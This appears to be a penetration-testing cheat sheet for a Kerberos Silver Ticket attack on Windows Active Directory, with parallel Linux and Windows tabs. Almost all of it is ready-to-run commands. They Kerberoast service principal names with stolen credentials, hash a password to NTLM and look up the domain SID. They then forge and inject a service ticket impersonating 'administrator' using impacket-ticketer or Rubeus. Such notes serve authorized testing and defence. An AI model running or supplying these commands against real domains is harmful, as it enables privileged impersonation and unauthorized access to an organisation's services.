---
title: "Silver Ticket"
date: 2024-7-30
tags: ["Pass-The-Ticket", "SID", "Rubeus", "Ticket Granting Ticket", "Silver Ticket", "Sidhistory", "Domain Controller", "Active Directory", "Windows", "GetUserSPNs"]
---

### Silver Ticket Attack

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Get service principle name (SPN)

```console
sudo ntpdate -s <DC> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -request -k
```

```console
# If NTLM auth is disabled
sudo ntpdate -s <DC> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-host <DC> -request -k
```

#### 2. Generate NTLM

```console
iconv -f ASCII -t UTF-16LE <(printf '<PASSWORD>') | openssl dgst -md4
```

#### 3. Get domain SID

```console
sudo ntpdate -s <DC> && impacket-getPac -targetUser administrator '<DOMAIN>/<USER>:<PASSWORD>'
```

#### 4. Generate Silver Ticket

```console
impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC> -spn <SPN> administrator
```

#### 5. Import ticket

```console
export KRB5CCNAME=administrator.ccache
```

#### 6. Check

```console
klist
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Get service principle name (SPN)

```console
.\rubeus.exe kerberoast /domain:<DOMAIN> /dc:<DC> /creduser:<DOMAIN>\<USER> /credpassword:'<PASSWORD>' /nowrap
```

#### 2. Generate NTLM

```console
.\rubeus.exe hash /password:'<PASSWORD>'
```

#### 3. Get domain SID

#### 3a. Locally

```console
import-module activedirectory
```

```console
Get-ADDomain | fl DomainSID
```

#### 3b. Remotely

```console
# Install ldp.exe (Windows 11)
Settings > System > Optional Features > More Windows Features and add 'Active Directory Lightweight Directory Services'
```

```console
# Bind > Bind with credentials
ldp.exe
```

```console
# Browse > Search
BaseDN: DC=<EXAMPLE>,DC=<COM>
Filter: (objectclass=User)
```

#### 4. Generate silver ticket

```console
.\rubeus.exe silver /domain:<DOMAIN> /dc:<DC> /sid:<SID> /rc4:<HASH> /user:administrator /service:<SPN> /nowrap /ptt
```

#### 5. Check

```console
klist
```

{{< /tabcontent >}}
